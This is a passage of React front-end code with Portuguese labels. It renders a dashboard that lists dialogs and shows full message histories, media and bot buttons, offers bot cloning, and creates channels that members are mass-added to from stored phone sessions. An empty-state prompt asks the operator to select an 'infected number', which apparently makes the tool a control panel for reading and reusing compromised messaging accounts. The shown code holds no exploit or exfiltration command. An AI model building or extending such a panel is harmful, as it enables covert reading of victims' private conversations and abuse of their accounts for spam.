                                                {selectedDialog.isScam && <span style={{color:'#f85149', fontSize:'16px'}}>⚠️</span>}
                                            </h3>
                                            <div style={{color:'#8b949e', fontSize:'13px', display:'flex', alignItems:'center', gap:'10px', marginTop:'4px'}}>
                                                <span style={{padding:'4px 8px', background:'rgba(139,148,158,0.2)', borderRadius:'6px', fontWeight:'500'}}>{selectedDialog.type}</span>
                                                {selectedDialog.participantsCount > 0 && <span>• {selectedDialog.participantsCount} membros</span>}
                                                {selectedDialog.username && <span>• @{selectedDialog.username}</span>}
                                                {selectedDialog.unreadCount > 0 && <span style={{color:'#e34234', fontWeight:'bold'}}>• {selectedDialog.unreadCount} não lidos</span>}
                                            </div>
                                        </div>
                                    </div>
                                    
                                    <div style={{display:'flex', gap:'12px'}}>
                                        {selectedDialog && selectedDialog.type === 'Bot' && (
                                            <button 
                                                onClick={cloneBot}
                                                disabled={loadingBotFlow}
                                                style={{
                                                    background: 'linear-gradient(135deg, #10b981 0%, #059669 100%)',
                                                    border: '1px solid #10b981',
                                                    color: 'white',
                                                    padding: '10px 20px',
                                                    borderRadius: '12px',
                                                    cursor: loadingBotFlow ? 'not-allowed' : 'pointer',
                                                    fontSize: '13px',
                                                    display:'flex',
                                                    alignItems:'center',
                                                    gap:'8px',
                                                    fontWeight:'500',
                                                    boxShadow:'0 2px 8px rgba(16, 185, 129, 0.3)',
                                                    transition:'all 0.2s ease'
                                                }}
                                                onMouseEnter={(e) => {
                                                    if (!loadingBotFlow) {
                                                        e.target.style.background = 'linear-gradient(135deg, #059669 0%, #10b981 100%)';
                                                        e.target.style.transform = 'translateY(-2px)';
                                                    }
                                                }}
                                                onMouseLeave={(e) => {
                                                    e.target.style.background = 'linear-gradient(135deg, #10b981 0%, #059669 100%)';
                                                    e.target.style.transform = 'translateY(0)';
                                                }}
                                            >
                                                {loadingBotFlow ? '⏳' : '🤖'} {loadingBotFlow ? 'Clonando...' : 'Clonar Bot'}
                                            </button>
                                        )}
                                        
                                        <button 
                                            onClick={refreshHistory}
                                            disabled={loadingInboxHistory}
                                            style={{
                                                background: 'linear-gradient(135deg, #21262d 0%, #30363d 100%)',
                                                border: '1px solid #30363d',
                                                color: '#58a6ff',
                                                padding: '10px 20px',
                                                borderRadius: '12px',
                                                cursor: loadingInboxHistory ? 'not-allowed' : 'pointer',
                                                fontSize: '13px',
                                                display:'flex',
                                                alignItems:'center',
                                                gap:'8px',
                                                fontWeight:'500',
                                                boxShadow:'0 2px 8px rgba(0,0,0,0.2)',
                                                transition:'all 0.2s ease'
                                            }}
                                            onMouseEnter={(e) => {
                                                if (!loadingInboxHistory) {
                                                    e.target.style.background = 'linear-gradient(135deg, #30363d 0%, #21262d 100%)';
                                                    e.target.style.transform = 'translateY(-2px)';
                                                }
                                            }}
                                            onMouseLeave={(e) => {
                                                e.target.style.background = 'linear-gradient(135deg, #21262d 0%, #30363d 100%)';
                                                e.target.style.transform = 'translateY(0)';
                                            }}
                                        >
                                            {loadingInboxHistory ? '⏳' : '🔄'} Atualizar
                                        </button>
                                    </div>
                                </div>
                            </div>

                            <div style={{flex:1, overflowY:'auto', padding:'24px', background: 'linear-gradient(180deg, #0d1117 0%, #161b22 100%)'}}>
                                {loadingInboxHistory ? (
                                    <div style={{textAlign:'center', padding:'120px 20px', color:'#8b949e'}}>
                                        <div style={{fontSize:'64px', marginBottom:'24px', animation: 'pulse 2s infinite'}}>⏳</div>
                                        <div style={{fontSize:'18px', marginBottom:'12px', fontWeight:'500'}}>Carregando conversa...</div>
                                        <div style={{fontSize:'13px', opacity:0.7}}>Isso pode levar alguns segundos</div>
                                    </div>
                                ) : inboxHistory.length === 0 ? (
                                    <div style={{textAlign:'center', padding:'120px 20px', color:'#8b949e'}}>
                                        <div style={{fontSize:'96px', marginBottom:'24px', opacity:0.6}}>💬</div>
                                        <div style={{fontSize:'20px', marginBottom:'12px', fontWeight:'500'}}>Nenhuma mensagem encontrada</div>
                                        <div style={{fontSize:'14px', opacity:0.7, maxWidth:'400px', margin:'0 auto', lineHeight:'1.6'}}>
                                            Este diálogo não possui mensagens ou elas não podem ser carregadas no momento
                                        </div>
                                    </div>
                                ) : (
                                    <div style={{display:'flex', flexDirection:'column', gap:'20px', maxWidth:'800px', margin:'0 auto'}}>
                                        {/* Separadores de data */}
                                        {inboxHistory.map((msg, index) => {
                                            const prevMsg = inboxHistory[index - 1];
                                            const showDateSeparator = !prevMsg || 
                                                new Date(msg.date).toDateString() !== new Date(prevMsg.date).toDateString();
                                            
                                            const isToday = new Date(msg.date).toDateString() === new Date().toDateString();
                                            const isYesterday = new Date(msg.date).toDateString() === new Date(Date.now() - 86400000).toDateString();
                                            
                                            return (
                                                <div key={msg.id}>
                                                    {showDateSeparator && (
                                                        <div style={{textAlign:'center', margin:'32px 0'}}>
                                                            <div style={{
                                                                background: 'linear-gradient(135deg, #30363d 0%, #21262d 100%)',
                                                                color: '#8b949e',
                                                                padding: '8px 20px',
                                                                borderRadius: '24px',
                                                                fontSize: '13px',
                                                                fontWeight:'600',
                                                                display: 'inline-block',
                                                                boxShadow: '0 2px 8px rgba(0,0,0,0.2)',
                                                                border: '1px solid #30363d'
                                                            }}>
                                                                {isToday ? 'Hoje' : isYesterday ? 'Ontem' : new Date(msg.date).toLocaleDateString('pt-BR', {
                                                                    weekday: 'long',
                                                                    day: 'numeric',
                                                                    month: 'long'
                                                                })}
                                                            </div>
                                                        </div>
                                                    )}
                                                    
                                                    <div style={{
                                                        display:'flex',
                                                        justifyContent: msg.isOut ? 'flex-end' : 'flex-start',
                                                        marginBottom:'8px',
                                                        animation: 'fadeInUp 0.3s ease-out'
                                                    }}>
                                                        <div style={{
                                                            maxWidth:'75%',
                                                            minWidth:'280px',
                                                            padding:'16px 20px',
                                                            borderRadius: msg.isOut ? '24px 24px 8px 24px' : '24px 24px 24px 8px',
                                                            background: msg.isOut ? 
                                                                'linear-gradient(135deg, #e34234 0%, #d63638 100%)' : 
                                                                'linear-gradient(135deg, #21262d 0%, #30363d 100%)',
                                                            border: msg.isOut ? '1px solid rgba(227, 66, 52, 0.3)' : '1px solid #30363d',
                                                            color: 'white',
                                                            wordBreak:'break-word',
                                                            position: 'relative',
                                                            boxShadow: msg.isOut ? 
                                                                '0 4px 16px rgba(227, 66, 52, 0.25)' : 
                                                                '0 4px 16px rgba(0, 0, 0, 0.15)',
                                                            transition: 'all 0.2s ease',
                                                            backdropFilter: 'blur(10px)'
                                                        }}
                                                        onMouseEnter={(e) => {
                                                            e.target.style.transform = 'scale(1.01)';
                                                            e.target.style.boxShadow = msg.isOut ? 
                                                                '0 6px 20px rgba(227, 66, 52, 0.35)' : 
                                                                '0 6px 20px rgba(0, 0, 0, 0.25)';
                                                        }}
                                                        onMouseLeave={(e) => {
                                                            e.target.style.transform = 'scale(1)';
                                                            e.target.style.boxShadow = msg.isOut ? 
                                                                '0 4px 16px rgba(227, 66, 52, 0.25)' : 
                                                                '0 4px 16px rgba(0, 0, 0, 0.15)';
                                                        }}
                                                    >
                                                        {/* Cabeçalho da mensagem */}
                                                        <div style={{
                                                            fontSize:'11px', 
                                                            color: msg.isOut ? 'rgba(255,255,255,0.7)' : 'rgba(139,148,158,0.9)', 
                                                            marginBottom:'10px', 
                                                            display:'flex', 
                                                            justifyContent:'space-between', 
                                                            alignItems:'center',
                                                            fontWeight:'500',
                                                            letterSpacing:'0.3px'
                                                        }}>
                                                            <span style={{
                                                                background: msg.isOut ? 'rgba(255,255,255,0.1)' : 'rgba(139,148,158,0.2)',
                                                                padding: '3px 8px',
                                                                borderRadius: '12px',
                                                                fontSize: '10px'
                                                            }}>
                                                                {msg.sender}
                                                            </span>
                                                            <span>{formatMessageTime(msg.date)}</span>
                                                        </div>

                                                        {/* Indicadores especiais */}
                                                        <div style={{display:'flex', gap:'6px', marginBottom:'10px', flexWrap:'wrap'}}>
                                                            {msg.isPinned && (
                                                                <span style={{
                                                                    background:'linear-gradient(135deg, #f0abfc 0%, #d946ef 100%)', 
                                                                    color:'white', 
                                                                    padding:'4px 10px', 
                                                                    borderRadius:'14px', 
                                                                    fontSize:'10px', 
                                                                    fontWeight:'bold',
                                                                    boxShadow: '0 2px 6px rgba(217, 70, 239, 0.3)'
                                                                }}>
                                                                    📌 Fixado
                                                                </span>
                                                            )}
                                                            {msg.forwarded && (
                                                                <span style={{
                                                                    background:'linear-gradient(135deg, #c9d1d9 0%, #8b949e 100%)', 
                                                                    color:'white', 
                                                                    padding:'4px 10px', 
                                                                    borderRadius:'14px', 
                                                                    fontSize:'10px', 
                                                                    fontWeight:'bold',
                                                                    boxShadow: '0 2px 6px rgba(139, 148, 158, 0.3)'
                                                                }}>
                                                                    ↪️ Encaminhado
                                                                </span>
                                                            )}
                                                            {msg.edits && (
                                                                <span style={{
                                                                    background:'linear-gradient(135deg, #ffd93d 0%, #f59e0b 100%)', 
                                                                    color:'white', 
                                                                    padding:'4px 10px', 
                                                                    borderRadius:'14px', 
                                                                    fontSize:'10px', 
                                                                    fontWeight:'bold',
                                                                    boxShadow: '0 2px 6px rgba(245, 158, 11, 0.3)'
                                                                }}>
                                                                    ✏️ Editada
                                                                </span>
                                                            )}
                                                            {msg.views > 0 && (
                                                                <span style={{
                                                                    background:'linear-gradient(135deg, #58a6ff 0%, #1e40af 100%)', 
                                                                    color:'white', 
                                                                    padding:'4px 10px', 
                                                                    borderRadius:'14px', 
                                                                    fontSize:'10px', 
                                                                    fontWeight:'bold',
                                                                    boxShadow: '0 2px 6px rgba(88, 166, 255, 0.3)'
                                                                }}>
                                                                    👁️ {msg.views}
                                                                </span>
                                                            )}
                                                        </div>

                                                        {/* Texto da mensagem */}
                                                        {msg.text && (
                                                            <div style={{
                                                                marginBottom:'12px', 
                                                                lineHeight:'1.7', 
                                                                fontSize:'15px',
                                                                whiteSpace:'pre-wrap',
                                                                wordBreak:'break-word'
                                                            }}>
                                                                {msg.text}
                                                            </div>
                                                        )}

                                                        {/* Mídia */}
                                                        {msg.media && (
                                                            <div style={{marginBottom:'12px'}}>
                                                                {msg.mediaType === 'photo' && (
                                                                    <div style={{position:'relative', display:'inline-block', borderRadius:'16px', overflow:'hidden'}}>
                                                                        <img 
                                                                            src={msg.media} 
                                                                            alt="Foto" 
                                                                            style={{maxWidth:'100%', display:'block', cursor:'pointer'}}
                                                                            onClick={() => window.open(msg.media, '_blank')}
                                                                        />
                                                                        <div style={{
                                                                            position:'absolute',
                                                                            bottom:'12px',
                                                                            right:'12px',
                                                                            background:'rgba(0,0,0,0.8)',
                                                                            color:'white',
                                                                            padding:'6px 12px',
                                                                            borderRadius:'12px',
                                                                            fontSize:'11px',
                                                                            fontWeight:'500',
                                                                            backdropFilter: 'blur(10px)'
                                                                        }}>
                                                                            📷 Foto
                                                                        </div>
                                                                    </div>
                                                                )}
                                                                {msg.mediaType === 'video_thumb' && (
                                                                    <div style={{position:'relative', display:'inline-block', borderRadius:'16px', overflow:'hidden'}}>
                                                                        <img 
                                                                            src={msg.media} 
                                                                            alt="Vídeo" 
                                                                            style={{maxWidth:'100%', display:'block', cursor:'pointer'}}
                                                                            onClick={() => window.open(msg.media, '_blank')}
                                                                        />
                                                                        <div style={{
                                                                            position:'absolute',
                                                                            top:'50%',
                                                                            left:'50%',
                                                                            transform:'translate(-50%, -50%)',
                                                                            background:'rgba(0,0,0,0.9)',
                                                                            color:'white',
                                                                            borderRadius:'50%',
                                                                            width:'56px',
                                                                            height:'56px',
                                                                            display:'flex',
                                                                            alignItems:'center',
                                                                            justifyContent:'center',
                                                                            fontSize:'24px',
                                                                            cursor:'pointer',
                                                                            backdropFilter: 'blur(10px)',
                                                                            boxShadow: '0 4px 16px rgba(0,0,0,0.4)'
                                                                        }}>
                                                                            ▶️
                                                                        </div>
                                                                        <div style={{
                                                                            position:'absolute',
                                                                            bottom:'12px',
                                                                            right:'12px',
                                                                            background:'rgba(0,0,0,0.8)',
                                                                            color:'white',
                                                                            padding:'6px 12px',
                                                                            borderRadius:'12px',
                                                                            fontSize:'11px',
                                                                            fontWeight:'500',
                                                                            backdropFilter: 'blur(10px)'
                                                                        }}>
                                                                            🎥 Vídeo
                                                                        </div>
                                                                    </div>
                                                                )}
                                                                {msg.mediaType === 'document' && (
                                                                    <div style={{
                                                                        padding:'16px', 
                                                                        background:'rgba(33,38,45,0.9)', 
                                                                        borderRadius:'16px', 
                                                                        fontSize:'13px', 
                                                                        display:'flex', 
                                                                        alignItems:'center', 
                                                                        gap:'16px', 
                                                                        border:'1px solid #30363d',
                                                                        backdropFilter: 'blur(10px)'
                                                                    }}>
                                                                        <div style={{
                                                                            width:'48px',
                                                                            height:'48px',
                                                                            background:'linear-gradient(135deg, #58a6ff 0%, #1e40af 100%)',
                                                                            borderRadius:'12px',
                                                                            display:'flex',
                                                                            alignItems:'center',
                                                                            justifyContent:'center',
                                                                            fontSize:'24px'
                                                                        }}>
                                                                            📎
                                                                        </div>
                                                                        <div style={{flex:1}}>
                                                                            <div style={{fontWeight:'600', marginBottom:'6px', fontSize:'14px'}}>{msg.fileName}</div>
                                                                            {msg.mediaSize > 0 && (
                                                                                <div style={{color:'#8b949e', fontSize:'11px'}}>
                                                                                    {formatFileSize(msg.mediaSize)}
                                                                                </div>
                                                                            )}
                                                                        </div>
                                                                    </div>
                                                                )}
                                                                {msg.mediaType === 'audio' && (
                                                                    <div style={{
                                                                        padding:'16px', 
                                                                        background:'rgba(33,38,45,0.9)', 
                                                                        borderRadius:'16px', 
                                                                        fontSize:'13px', 
                                                                        display:'flex', 
                                                                        alignItems:'center', 
                                                                        gap:'16px', 
                                                                        border:'1px solid #30363d',
                                                                        backdropFilter: 'blur(10px)'
                                                                    }}>
                                                                        <div style={{
                                                                            width:'48px',
                                                                            height:'48px',
                                                                            background:'linear-gradient(135deg, #10b981 0%, #059669 100%)',
                                                                            borderRadius:'12px',
                                                                            display:'flex',
                                                                            alignItems:'center',
                                                                            justifyContent:'center',
                                                                            fontSize:'24px'
                                                                        }}>
                                                                            🎵
                                                                        </div>
                                                                        <div style={{flex:1}}>
                                                                            <div style={{fontWeight:'600', marginBottom:'6px', fontSize:'14px'}}>{msg.fileName}</div>
                                                                            {msg.mediaSize > 0 && (
                                                                                <div style={{color:'#8b949e', fontSize:'11px'}}>
                                                                                    {formatFileSize(msg.mediaSize)}
                                                                                </div>
                                                                            )}
                                                                        </div>
                                                                    </div>
                                                                )}
                                                                {msg.mediaType === 'voice' && (
                                                                    <div style={{
                                                                        padding:'16px', 
                                                                        background:'rgba(33,38,45,0.9)', 
                                                                        borderRadius:'16px', 
                                                                        fontSize:'13px', 
                                                                        display:'flex', 
                                                                        alignItems:'center', 
                                                                        gap:'16px', 
                                                                        border:'1px solid #30363d',
                                                                        backdropFilter: 'blur(10px)'
                                                                    }}>
                                                                        <div style={{
                                                                            width:'48px',
                                                                            height:'48px',
                                                                            background:'linear-gradient(135deg, #8b5cf6 0%, #7c3aed 100%)',
                                                                            borderRadius:'12px',
                                                                            display:'flex',
                                                                            alignItems:'center',
                                                                            justifyContent:'center',
                                                                            fontSize:'24px'
                                                                        }}>
                                                                            🎤
                                                                        </div>
                                                                        <div style={{flex:1}}>
                                                                            <div style={{fontWeight:'600', marginBottom:'6px', fontSize:'14px'}}>Áudio de voz</div>
                                                                            {msg.mediaSize > 0 && (
                                                                                <div style={{color:'#8b949e', fontSize:'11px'}}>
                                                                                    {formatFileSize(msg.mediaSize)}
                                                                                </div>
                                                                            )}
                                                                        </div>
                                                                    </div>
                                                                )}
                                                                {msg.mediaType === 'sticker' && (
                                                                    <div style={{
                                                                        padding:'20px', 
                                                                        background:'rgba(33,38,45,0.9)', 
                                                                        borderRadius:'16px', 
                                                                        fontSize:'14px', 
                                                                        textAlign:'center', 
                                                                        border:'1px solid #30363d',
                                                                        backdropFilter: 'blur(10px)'
                                                                    }}>
                                                                        <div style={{fontSize:'48px', marginBottom:'8px'}}>😀</div>
                                                                        <div style={{fontWeight:'500'}}>Sticker</div>
                                                                    </div>
                                                                )}
                                                                {msg.mediaType === 'contact' && (
                                                                    <div style={{
                                                                        padding:'16px', 
                                                                        background:'rgba(33,38,45,0.9)', 
                                                                        borderRadius:'16px', 
                                                                        fontSize:'13px', 
                                                                        display:'flex', 
                                                                        alignItems:'center', 
                                                                        gap:'16px', 
                                                                        border:'1px solid #30363d',
                                                                        backdropFilter: 'blur(10px)'
                                                                    }}>
                                                                        <div style={{
                                                                            width:'48px',
                                                                            height:'48px',
                                                                            background:'linear-gradient(135deg, #ef4444 0%, #dc2626 100%)',
                                                                            borderRadius:'12px',
                                                                            display:'flex',
                                                                            alignItems:'center',
                                                                            justifyContent:'center',
                                                                            fontSize:'24px'
                                                                        }}>
                                                                            👤
                                                                        </div>
                                                                        <div style={{flex:1, fontSize:'14px', fontWeight:'500'}}>{msg.fileName}</div>
                                                                    </div>
                                                                )}
                                                                {msg.mediaType === 'location' && (
                                                                    <div style={{
                                                                        padding:'16px', 
                                                                        background:'rgba(33,38,45,0.9)', 
                                                                        borderRadius:'16px', 
                                                                        fontSize:'13px', 
                                                                        display:'flex', 
                                                                        alignItems:'center', 
                                                                        gap:'16px', 
                                                                        border:'1px solid #30363d',
                                                                        backdropFilter: 'blur(10px)'
                                                                    }}>
                                                                        <div style={{
                                                                            width:'48px',
                                                                            height:'48px',
                                                                            background:'linear-gradient(135deg, #f59e0b 0%, #d97706 100%)',
                                                                            borderRadius:'12px',
                                                                            display:'flex',
                                                                            alignItems:'center',
                                                                            justifyContent:'center',
                                                                            fontSize:'24px'
                                                                        }}>
                                                                            📍
                                                                        </div>
                                                                        <div style={{flex:1, fontSize:'14px', fontWeight:'500'}}>{msg.fileName}</div>
                                                                    </div>
                                                                )}
                                                                {msg.mediaType === 'error' && (
                                                                    <div style={{
                                                                        padding:'16px', 
                                                                        background:'rgba(239,68,68,0.2)', 
                                                                        borderRadius:'12px', 
                                                                        fontSize:'12px', 
                                                                        textAlign:'center', 
                                                                        border:'1px solid #ef4444',
                                                                        color: '#ef4444'
                                                                    }}>
                                                                        ❌ Erro ao carregar mídia
                                                                    </div>
                                                                )}
                                                                {msg.mediaType === 'timeout' && (
                                                                    <div style={{
                                                                        padding:'16px', 
                                                                        background:'rgba(245,158,11,0.2)', 
                                                                        borderRadius:'12px', 
                                                                        fontSize:'12px', 
                                                                        textAlign:'center', 
                                                                        border:'1px solid #f59e0b',
                                                                        color: '#f59e0b'
                                                                    }}>
                                                                        ⏱️ Timeout ao carregar mídia
                                                                    </div>
                                                                )}
                                                            </div>
                                                        )}

                                                        {/* Links */}
                                                        {msg.links && msg.links.length > 0 && (
                                                            <div style={{marginTop:'12px'}}>
                                                                {msg.links.map((link, idx) => (
                                                                    <a 
                                                                        key={idx}
                                                                        href={link} 
                                                                        target="_blank" 
                                                                        rel="noopener noreferrer"
                                                                        style={{
                                                                            color:'#58a6ff', 
                                                                            textDecoration:'none', 
                                                                            fontSize:'13px', 
                                                                            display:'block', 
                                                                            wordBreak:'break-all', 
                                                                            marginBottom:'8px', 
                                                                            padding:'12px 16px',
                                                                            background:'rgba(88,166,255,0.15)', 
                                                                            borderRadius:'12px', 
                                                                            border:'1px solid rgba(88,166,255,0.3)',
                                                                            transition:'all 0.2s ease'
                                                                        }}
                                                                        onMouseEnter={(e) => {
                                                                            e.target.style.background = 'rgba(88,166,255,0.25)';
                                                                            e.target.style.transform = 'translateX(4px)';
                                                                        }}
                                                                        onMouseLeave={(e) => {
                                                                            e.target.style.background = 'rgba(88,166,255,0.15)';
                                                                            e.target.style.transform = 'translateX(0)';
                                                                        }}
                                                                    >
                                                                        🔗 {link}
                                                                    </a>
                                                                ))}
                                                            </div>
                                                        )}

                                                        {/* Botões do Bot */}
                                                        {msg.buttons && msg.buttons.length > 0 && (
                                                            <div style={{marginTop:'12px', display:'flex', flexDirection:'column', gap:'8px'}}>
                                                                {msg.buttons.map((button, idx) => (
                                                                    <div key={idx} style={{
                                                                        background: button.url ? 
                                                                            'linear-gradient(135deg, #10b981 0%, #059669 100%)' : 
                                                                            'linear-gradient(135deg, #6366f1 0%, #4f46e5 100%)',
                                                                        color: 'white',
                                                                        padding: '12px 16px',
                                                                        borderRadius: '12px',
                                                                        fontSize: '13px',
                                                                        fontWeight: '600',
                                                                        display: 'flex',
                                                                        alignItems: 'center',
                                                                        gap: '10px',
                                                                        boxShadow: button.url ? 
                                                                            '0 2px 8px rgba(16, 185, 129, 0.3)' : 
                                                                            '0 2px 8px rgba(99, 102, 241, 0.3)',
                                                                        border: button.url ? 
                                                                            '1px solid rgba(16, 185, 129, 0.4)' : 
                                                                            '1px solid rgba(99, 102, 241, 0.4)',
                                                                        transition: 'all 0.2s ease',
                                                                        cursor: button.url ? 'pointer' : 'default'
                                                                    }}
                                                                    onClick={() => {
                                                                        if (button.url) {
                                                                            window.open(button.url, '_blank');
                                                                        }
                                                                    }}
                                                                    onMouseEnter={(e) => {
                                                                        if (button.url) {
                                                                            e.target.style.transform = 'translateY(-2px)';
                                                                            e.target.style.boxShadow = button.url ? 
                                                                                '0 4px 12px rgba(16, 185, 129, 0.4)' : 
                                                                                '0 4px 12px rgba(99, 102, 241, 0.4)';
                                                                        }
                                                                    }}
                                                                    onMouseLeave={(e) => {
                                                                        e.target.style.transform = 'translateY(0)';
                                                                        e.target.style.boxShadow = button.url ? 
                                                                            '0 2px 8px rgba(16, 185, 129, 0.3)' : 
                                                                            '0 2px 8px rgba(99, 102, 241, 0.3)';
                                                                    }}
                                                                    >
                                                                        <span style={{fontSize:'16px'}}>
                                                                            {button.url ? '🔗' : '🎯'}
                                                                        </span>
                                                                        <span>{button.text}</span>
                                                                        {button.url && (
                                                                            <span style={{marginLeft:'auto', fontSize:'10px', opacity:0.8}}>
                                                                                EXTERNO
                                                                            </span>
                                                                        )}
                                                                        {button.data && (
                                                                            <span style={{marginLeft:'auto', fontSize:'10px', opacity:0.8}}>
                                                                                CALLBACK
                                                                            </span>
                                                                        )}
                                                                    </div>
                                                                ))}
                                                            </div>
                                                        )}

                                                        {/* Informações de encaminhamento */}
                                                        {msg.forwarded && (
                                                            <div style={{
                                                                fontSize:'10px', 
                                                                color:'rgba(139,148,158,0.8)', 
                                                                fontStyle:'italic', 
                                                                marginTop:'12px', 
                                                                borderTop:'1px solid rgba(139,148,158,0.2)', 
                                                                paddingTop:'12px', 
                                                                lineHeight:'1.5'
                                                            }}>
                                                                ↪️ Encaminhado de {msg.forwarded.from}
                                                                {msg.forwarded.date && (
                                                                    <span> • {formatMessageTime(msg.forwarded.date)}</span>
                                                                )}
                                                            </div>
                                                        )}
                                                    </div>
                                                </div>
                                            </div>
                                        );
                                    })}
                                    </div>
                                )}
                            </div>
                        </>
                    ) : (
                        <div style={{display:'flex', alignItems:'center', justifyContent:'center', height:'100%', color:'#8b949e', textAlign:'center'}}>
                            <div>
                                <div style={{fontSize:'64px', marginBottom:'20px'}}>📬</div>
                                <div style={{fontSize:'18px', marginBottom:'10px', fontWeight:'bold'}}>Nenhum diálogo selecionado</div>
                                <div style={{fontSize:'14px', opacity:0.7, maxWidth:'300px', margin:'0 auto'}}>
                                    Selecione um número infectado e depois um diálogo para visualizar as mensagens completas
                                </div>
                            </div>
                        </div>
                    )}
                </div>
            </div>
        )}

        {/* --- ABA CANAIS (ESTILO GRUPOS) --- */}
        {tab === 'channels' && (
            <div style={{padding:'20px'}}>
                <h3 style={{color:'white', marginBottom:'20px'}}>📺 GERENCIADOR DE CANAIS</h3>
                
                {/* SEÇÃO 1: CRIAÇÃO DE CANAL */}
                <div style={{background:'#161b22', padding:'20px', borderRadius:'12px', marginBottom:'20px', border:'1px solid #30363d'}}>
                    <h4 style={{color:'white', marginTop:0, marginBottom:'15px'}}>📺 Criar Novo Canal</h4>
                    
                    <div style={{display:'grid', gridTemplateColumns:'1fr 1fr', gap:'15px', marginBottom:'15px'}}>
                        <div>
                            <label style={{color:'#8b949e', fontSize:'12px', display:'block', marginBottom:'5px'}}>Nome do Canal</label>
                            <input 
                                type="text" 
                                value={channelName}
                                onChange={(e) => setChannelName(e.target.value)}
                                placeholder="Ex: Meu Canal Oficial"
                                style={{width:'100%', padding:'10px', background:'#0d1117', color:'white', border:'1px solid #30363d', borderRadius:'6px', fontSize:'14px'}}
                            />
                        </div>
                        <div>
                            <label style={{color:'#8b949e', fontSize:'12px', display:'block', marginBottom:'5px'}}>Telefone Criador</label>
                            <select 
                                value={Array.from(selectedChannelPhones)[0] || ''} 
                                onChange={(e) => {
                                    const newSet = new Set();
                                    if (e.target.value) newSet.add(e.target.value);
                                    setSelectedChannelPhones(newSet);
                                }}
                                style={{width:'100%', padding:'10px', background:'#0d1117', color:'white', border:'1px solid #30363d', borderRadius:'6px', fontSize:'14px'}}
                            >
                                <option value="">Selecione...</option>
                                {sessions.map(session => (
                                    <option key={session.phone_number} value={session.phone_number}>
                                        {session.phone_number}
                                    </option>
                                ))}
                            </select>
                        </div>
                    </div>
                    
                    <div style={{marginBottom:'15px'}}>
                        <label style={{color:'#8b949e', fontSize:'12px', display:'block', marginBottom:'5px'}}>Descrição (Opcional)</label>
                        <textarea 
                            value={channelDescription}
                            onChange={(e) => setChannelDescription(e.target.value)}
                            placeholder="Descrição do canal..."
                            style={{width:'100%', padding:'10px', background:'#0d1117', color:'white', border:'1px solid #30363d', borderRadius:'6px', fontSize:'14px', minHeight:'60px', resize:'vertical'}}
                        />
                    </div>
                    
                    <button 
                        onClick={createChannel}
                        disabled={creatingChannel || !channelName.trim() || selectedChannelPhones.size === 0}
                        style={{
                            padding:'12px 24px',
                            background:'linear-gradient(135deg, #1f6feb 0%, #1a5fb4 100%)',
                            color:'white',
                            border:'none',
                            borderRadius:'6px',
                            cursor:creatingChannel || !channelName.trim() || selectedChannelPhones.size === 0 ? 'not-allowed' : 'pointer',
                            fontSize:'14px',
                            fontWeight:'bold'
                        }}
                    >
                        {creatingChannel ? '⏳ Criando Canal...' : '📺 Criar Canal'}
                    </button>
                </div>

                {/* SEÇÃO 2: CANAIS CRIADOS */}
                <div style={{background:'#161b22', padding:'20px', borderRadius:'12px', marginBottom:'20px', border:'1px solid #30363d'}}>
                    <h4 style={{color:'white', marginTop:0, marginBottom:'15px'}}>📋 Canais Criados</h4>
                    
                    {channels.length === 0 ? (
                        <div style={{textAlign:'center', padding:'40px', color:'#8b949e'}}>
                            <div style={{fontSize:'48px', marginBottom:'15px'}}>📺</div>
                            <div>Nenhum canal criado ainda</div>
                        </div>
                    ) : (
                        <div style={{display:'grid', gridTemplateColumns:'repeat(auto-fill, minmax(300px, 1fr))', gap:'15px'}}>
                            {channels.map(channel => (
                                <div key={channel.channel_id} style={{
                                    background:'#0d1117',
                                    border:'1px solid #30363d',
                                    borderRadius:'8px',
                                    padding:'15px',
                                    cursor:'pointer',
                                    transition:'all 0.2s ease'
                                }} onClick={() => setSelectedChannel(channel)}>
                                    <div style={{display:'flex', justifyContent:'space-between', alignItems:'center', marginBottom:'10px'}}>
                                        <h5 style={{margin:0, color:'white', fontSize:'16px'}}>{channel.channel_name}</h5>
                                        <span style={{
                                            padding:'4px 8px',
                                            background:channel.status === 'broadcast_sent' ? '#238636' : 
                                                      channel.status === 'members_added' ? '#f59e0b' : '#1f6feb',
                                            borderRadius:'4px',
                                            fontSize:'10px',
                                            fontWeight:'bold',
                                            color:'white'
                                        }}>
                                            {channel.status === 'broadcast_sent' ? 'ENVIADO' : 
                                             channel.status === 'members_added' ? 'MEMBROS' : 'CRIADO'}
                                        </span>
                                    </div>
                                    <div style={{color:'#8b949e', fontSize:'12px', marginBottom:'8px'}}>
                                        🆔 ID: {channel.channel_id}
                                    </div>
                                    <div style={{color:'#8b949e', fontSize:'12px', marginBottom:'8px'}}>
                                        👥 Membros: {channel.total_members || 0}
                                    </div>
                                    <div style={{color:'#8b949e', fontSize:'11px'}}>
                                        📅 {new Date(channel.created_at).toLocaleDateString('pt-BR')}
                                    </div>
                                </div>
                            ))}
                        </div>
                    )}
                </div>

                {/* SEÇÃO 3: GERENCIAMENTO (APENAS SE TIVER CANAL SELECIONADO) */}
                {selectedChannel && (
                    <div style={{background:'#161b22', padding:'20px', borderRadius:'12px', border:'1px solid #30363d'}}>
                        <h4 style={{color:'white', marginTop:0, marginBottom:'15px'}}>⚙️ Gerenciar Canal: {selectedChannel.channel_name}</h4>
                        
                        <div style={{display:'grid', gridTemplateColumns:'1fr 1fr', gap:'20px'}}>
                            {/* ADICIONAR MEMBROS */}
                            <div>
                                <h5 style={{color:'white', marginTop:0, marginBottom:'10px'}}>👥 Adicionar Membros</h5>
                                
                                <div style={{marginBottom:'10px'}}>
                                    <label style={{color:'#8b949e', fontSize:'12px', display:'block', marginBottom:'5px'}}>
                                        Telefones para Adicionar ({selectedChannelPhones.size})
                                    </label>
                                    <div style={{maxHeight:'120px', overflowY:'auto', border:'1px solid #30363d', borderRadius:'6px', padding:'10px', background:'#0d1117'}}>
                                        {sessions.map(session => (
                                            <label key={session.phone_number} style={{display:'flex', alignItems:'center', gap:'8px', color:'white', cursor:'pointer', fontSize:'12px', marginBottom:'5px'}}>
                                                <input 
                                                    type="checkbox" 
                                                    checked={selectedChannelPhones.has(session.phone_number)}
                                                    onChange={(e) => {
                                                        const newSet = new Set(selectedChannelPhones);
                                                        if (e.target.checked) {
                                                            newSet.add(session.phone_number);
                                                        } else {
                                                            newSet.delete(session.phone_number);
                                                        }
                                                        setSelectedChannelPhones(newSet);
                                                    }}
                                                    style={{margin:0}}
                                                />
                                                <span>{session.phone_number}</span>
                                            </label>
                                        ))}
                                    </div>
                                </div>
                                
                                <button 
                                    onClick={addMembersToChannel}
                                    disabled={addingMembers || selectedChannelPhones.size === 0}
                                    style={{
                                        width:'100%',
                                        padding:'10px',
